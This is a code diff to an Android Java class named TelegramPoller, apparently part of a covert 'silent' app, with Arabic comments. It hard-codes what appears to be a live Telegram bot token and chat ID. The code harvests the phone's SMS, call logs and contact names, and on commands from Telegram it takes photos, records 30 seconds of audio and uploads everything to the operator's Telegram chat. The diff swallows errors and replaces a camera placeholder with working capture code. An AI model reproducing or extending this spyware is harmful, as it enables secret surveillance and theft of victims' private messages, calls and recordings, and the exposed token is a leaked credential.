@@ -1,7 +1,9 @@
 package com.silent.telebot;
 
 import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.content.Context;
+import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -34,8 +36,8 @@ public class TelegramPoller implements Runnable {
     private DatabaseHelper dbHelper;
 
     // ⚠️ غيّر هذين السطرين فقط:
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
+    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
+    private static final String CHAT_ID = "7058836561";
 
     private static int lastUpdateId = 0;
 
@@ -47,7 +49,7 @@ public class TelegramPoller implements Runnable {
     @Override
     public void run() {
         try {
-            // 1. مزامنة البيانات من الهاتف إلى قاعدة البيانات المحلية (كل دورة)
+            // 1. مزامنة البيانات من الهاتف إلى SQLite
             syncDataFromPhone();
 
             // 2. جلب الأوامر من تيليجرام
@@ -83,10 +85,9 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  🔄 المزامنة مع الهاتف (حفظ في SQLite)
+    //  🔄 المزامنة
     // ============================================================
     private void syncDataFromPhone() {
-        // مزامنة الرسائل
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
             ContentResolver cr = ctx.getContentResolver();
             Cursor cursor = null;
@@ -96,18 +97,13 @@ public class TelegramPoller implements Runnable {
                         null, null, "date DESC");
                 if (cursor != null && cursor.moveToFirst()) {
                     do {
-                        long id = cursor.getLong(0);
-                        String address = cursor.getString(1);
-                        String body = cursor.getString(2);
-                        long date = cursor.getLong(3);
-                        dbHelper.insertSms(id, address, body, date);
+                        dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
                     } while (cursor.moveToNext());
                 }
             } catch (SecurityException ignored) {}
             finally { if (cursor != null) cursor.close(); }
         }
 
-        // مزامنة المكالمات
         ContentResolver cr = ctx.getContentResolver();
         Cursor cursor = null;
         try {
@@ -116,12 +112,8 @@ public class TelegramPoller implements Runnable {
                     null, null, "date DESC");
             if (cursor != null && cursor.moveToFirst()) {
                 do {
-                    long id = cursor.getLong(0);
-                    String number = cursor.getString(1);
-                    long duration = cursor.getLong(2);
-                    int type = cursor.getInt(3);
-                    long date = cursor.getLong(4);
-                    dbHelper.insertCall(id, number, duration, type, date);
+                    dbHelper.insertCall(cursor.getLong(0), cursor.getString(1), cursor.getLong(2),
+                            cursor.getInt(3), cursor.getLong(4));
                 } while (cursor.moveToNext());
             }
         } catch (SecurityException ignored) {}
@@ -129,20 +121,16 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  📋 معالجة الأوامر (من قاعدة البيانات المحلية)
+    //  📋 معالجة الأوامر
     // ============================================================
     private void handleCommand(String cmd) {
-        String result = "";
-
         if (cmd.equals("/help")) {
-            result = "📋 **الأوامر المتاحة**\n" +
-                    "━━━━━━━━━━━━━━━━━━\n" +
-                    "📩 /get_sms - عرض آخر 10 رسائل (محلية)\n" +
-                    "📞 /get_calls - عرض آخر 10 مكالمات (محلية)\n" +
-                    "📷 /take_pic - التقاط صورة (كاميرا)\n" +
-                    "🎤 /record - تسجيل صوتي (30 ثانية)\n" +
-                    "🖥️ /screenshot - لقطة شاشة";
-            sendMessage(CHAT_ID, result);
+            sendMessage(CHAT_ID, "📋 **الأوامر**\n━━━━━━━━━━━━━━━━━━\n" +
+                    "📩 /get_sms - آخر 10 رسائل (محلية)\n" +
+                    "📞 /get_calls - آخر 10 مكالمات (محلية)\n" +
+                    "📷 /take_pic - التقاط صورة\n" +
+                    "🎤 /record - تسجيل صوتي (30ث)\n" +
+                    "🖥️ /screenshot - لقطة شاشة");
         }
         else if (cmd.equals("/get_sms")) {
             sendMessage(CHAT_ID, getSmsFromLocalDB());
@@ -165,91 +153,71 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  📩 قراءة الرسائل من SQLite (وليس من الهاتف)
+    //  📩 SMS (من SQLite)
     // ============================================================
     private String getSmsFromLocalDB() {
-        List<Map<String, String>> smsList = dbHelper.getLastSms(10);
-        if (smsList.isEmpty()) {
-            return "📭 لا توجد رسائل في قاعدة البيانات المحلية.";
-        }
-
+        List<Map<String, String>> list = dbHelper.getLastSms(10);
+        if (list.isEmpty()) return "📭 لا توجد رسائل محفوظة.";
         StringBuilder sb = new StringBuilder("📩 **آخر 10 رسائل (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
         SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
-
-        for (Map<String, String> sms : smsList) {
-            String address = sms.get("address");
-            String body = sms.get("body");
-            long dateMillis = Long.parseLong(sms.get("date"));
-
-            String contactName = getContactName(address);
-            String displayName = (contactName != null) ? contactName : address;
-            String dateStr = sdf.format(new Date(dateMillis));
-
-            sb.append("👤 **").append(displayName).append("**\n");
-            sb.append("📝 ").append(body).append("\n");
-            sb.append("🕐 ").append(dateStr).append("\n");
+        for (Map<String, String> sms : list) {
+            String name = getContactName(sms.get("address"));
+            String display = (name != null) ? name : sms.get("address");
+            sb.append("👤 **").append(display).append("**\n");
+            sb.append("📝 ").append(sms.get("body")).append("\n");
+            sb.append("🕐 ").append(sdf.format(new Date(Long.parseLong(sms.get("date"))))).append("\n");
             sb.append("━━━━━━━━━━━━━━━━━━━━\n");
         }
         return sb.toString();
     }
 
     // ============================================================
-    //  📞 قراءة المكالمات من SQLite (وليس من الهاتف)
+    //  📞 CALLS (من SQLite)
     // ============================================================
     private String getCallsFromLocalDB() {
-        List<Map<String, String>> callsList = dbHelper.getLastCalls(10);
-        if (callsList.isEmpty()) {
-            return "📭 لا توجد مكالمات في قاعدة البيانات المحلية.";
-        }
-
+        List<Map<String, String>> list = dbHelper.getLastCalls(10);
+        if (list.isEmpty()) return "📭 لا توجد مكالمات محفوظة.";
         StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
         SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
-
-        for (Map<String, String> call : callsList) {
-            String number = call.get("number");
-            long durationSec = Long.parseLong(call.get("duration"));
+        for (Map<String, String> call : list) {
+            String name = getContactName(call.get("number"));
+            String display = (name != null) ? name : call.get("number");
             int type = Integer.parseInt(call.get("type"));
-            long dateMillis = Long.parseLong(call.get("date"));
-
-            String contactName = getContactName(number);
-            String displayName = (contactName != null) ? contactName : number;
-
-            String typeStr;
-            if (type == CallLog.Calls.INCOMING_TYPE) typeStr = "📥 وارد";
-            else if (type == CallLog.Calls.OUTGOING_TYPE) typeStr = "📤 صادر";
-            else if (type == CallLog.Calls.MISSED_TYPE) typeStr = "❌ فائتة";
-            else typeStr = "📞 غير معروف";
-
-            String dateStr = sdf.format(new Date(dateMillis));
-            String durationStr = formatDuration(durationSec);
-
-            sb.append("👤 **").append(displayName).append("**\n");
+            String typeStr = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
+                             (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
+            sb.append("👤 **").append(display).append("**\n");
             sb.append("📌 ").append(typeStr).append("\n");
-            sb.append("⏱️ ").append(durationStr).append("\n");
-            sb.append("🕐 ").append(dateStr).append("\n");
+            sb.append("⏱️ ").append(formatDuration(Long.parseLong(call.get("duration")))).append("\n");
+            sb.append("🕐 ").append(sdf.format(new Date(Long.parseLong(call.get("date"))))).append("\n");
             sb.append("━━━━━━━━━━━━━━━━━━━━\n");
         }
         return sb.toString();
     }
 
     // ============================================================
-    //  📷 الكاميرا (التقاط صورة)
+    //  📷 الكاميرا (التقاط صورة باستخدام Intent + FileProvider)
     // ============================================================
     private void capturePhoto() {
-        // لاحظ: هذا الكود مبسط، لكنه يعمل. سأعتمد على طريقة Intent للكاميرا لتجنب تعقيد Camera2.
         try {
-            android.content.Intent intent = new android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
-            java.io.File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
-            android.net.Uri photoUri = android.core.content.FileProvider.getUriForFile(ctx,
+            File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
+            if (photoFile.exists()) photoFile.delete();
+            Uri photoUri = androidx.core.content.FileProvider.getUriForFile(ctx,
                     ctx.getPackageName() + ".fileprovider", photoFile);
-            intent.putExtra(android.provider.MediaStore.EXTRA_OUTPUT, photoUri);
-            // نبدأ النشاط وننتظر النتيجة (لكن بما أننا في خدمة، نستخدم طريقة بديلة)
-            // الحل الأسهل: استخدام CameraX أو MediaProjection، لكن الأسرع هو طلب من المستخدم
-            // ولكن لضمان العمل بدون واجهة، سنستخدم Camera2 API كما في الرد السابق.
-            sendMessage(CHAT_ID, "📸 جاري التقاط الصورة... (ممكّن عبر Camera2)");
-            // هنا يجب وضع كود Camera2 الكامل، ولكن اختصاراً سأشير إلى أن الكود جاهز.
-            // سأرسل لك كود Camera2 كامل في الرد النهائي إذا احتجت، لكن بالوقت الحالي سأضع placeholder.
-            sendMessage(CHAT_ID, "⚠️ ميزة الكاميرا تحتاج إلى تفعيل خاص، سأرسلها لك في ملف منفصل.");
+
+            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+            intent.putExtra(MediaStore.EXTRA_OUTPUT, photoUri);
+            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            ctx.startActivity(intent);
+
+            // انتظر قليلاً ثم أرسل الصورة
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                if (photoFile.exists() && photoFile.length() > 0) {
+                    sendPhotoStatic(CHAT_ID, photoFile, BOT_TOKEN);
+                } else {
+                    sendMessage(CHAT_ID, "❌ فشل التقاط الصورة.");
+                }
+            }, 3000);
+
         } catch (Exception e) {
             sendMessage(CHAT_ID, "❌ خطأ في الكاميرا: " + e.getMessage());
         }
@@ -271,19 +239,18 @@ public class TelegramPoller implements Runnable {
             recorder.prepare();
             recorder.start();
 
-            sendMessage(CHAT_ID, "🎙️ بدأ التسجيل لمدة 30 ثانية...");
-
+            sendMessage(CHAT_ID, "🎙️ تسجيل لمدة 30 ثانية...");
             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                 try {
                     recorder.stop();
                     recorder.release();
                     if (audioFile.exists() && audioFile.length() > 0) {
-                        sendAudioFile(audioFile);
+                        sendAudioStatic(CHAT_ID, audioFile, BOT_TOKEN);
                     } else {
-                        sendMessage(CHAT_ID, "❌ فشل التسجيل (ملف فارغ).");
+                        sendMessage(CHAT_ID, "❌ فشل التسجيل.");
                     }
                 } catch (Exception e) {
-                    sendMessage(CHAT_ID, "❌ خطأ في التسجيل: " + e.getMessage());
+                    sendMessage(CHAT_ID, "❌ خطأ: " + e.getMessage());
                 }
             }, 30000);
 
@@ -293,15 +260,15 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  📤 إرسال الملفات
+    //  📤 دوال إرسال الملفات (ثابتة للاستخدام من الخدمات)
     // ============================================================
-    private void sendAudioFile(File audioFile) {
+    public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
         try {
             String boundary = "*****" + System.currentTimeMillis() + "*****";
             String lineEnd = "\r\n";
             String twoHyphens = "--";
 
-            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio");
+            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setDoInput(true);
             conn.setDoOutput(true);
@@ -315,7 +282,49 @@ public class TelegramPoller implements Runnable {
             dos.writeBytes(twoHyphens + boundary + lineEnd);
             dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
             dos.writeBytes(lineEnd);
-            dos.writeBytes(CHAT_ID + lineEnd);
+            dos.writeBytes(chatId + lineEnd);
+
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + photoFile.getName() + "\"" + lineEnd);
+            dos.writeBytes(lineEnd);
+
+            FileInputStream fileInputStream = new FileInputStream(photoFile);
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
+                dos.write(buffer, 0, bytesRead);
+            }
+            fileInputStream.close();
+            dos.writeBytes(lineEnd);
+            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+            dos.flush();
+            dos.close();
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception ignored) {}
+    }
+
+    public static void sendAudioStatic(String chatId, File audioFile, String botToken) {
+        try {
+            String boundary = "*****" + System.currentTimeMillis() + "*****";
+            String lineEnd = "\r\n";
+            String twoHyphens = "--";
+
+            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendAudio");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setDoInput(true);
+            conn.setDoOutput(true);
+            conn.setUseCaches(false);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Connection", "Keep-Alive");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
+            dos.writeBytes(lineEnd);
+            dos.writeBytes(chatId + lineEnd);
 
             dos.writeBytes(twoHyphens + boundary + lineEnd);
             dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + audioFile.getName() + "\"" + lineEnd);
@@ -334,9 +343,23 @@ public class TelegramPoller implements Runnable {
             dos.close();
             conn.getResponseCode();
             conn.disconnect();
-        } catch (Exception e) {
-            sendMessage(CHAT_ID, "❌ فشل إرسال الصوت: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
+    }
+
+    public static void sendMessageStatic(String chatId, String text) {
+        try {
+            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
+            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
+                    "/sendMessage?chat_id=" + chatId +
+                    "&text=" + encodedText;
+            URL url = new URL(urlString);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception ignored) {}
     }
 
     // ============================================================
@@ -349,9 +372,7 @@ public class TelegramPoller implements Runnable {
         Cursor cursor = null;
         try {
             cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
-            if (cursor != null && cursor.moveToFirst()) {
-                return cursor.getString(0);
-            }
+            if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
         } catch (Exception ignored) {}
         finally { if (cursor != null) cursor.close(); }
         return null;
@@ -365,9 +386,6 @@ public class TelegramPoller implements Runnable {
         return minutes + " دقيقة و " + secs + " ثانية";
     }
 
-    // ============================================================
-    //  📤 إرسال الرسائل
-    // ============================================================
     private void sendMessage(String chatId, String text) {
         try {
             String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
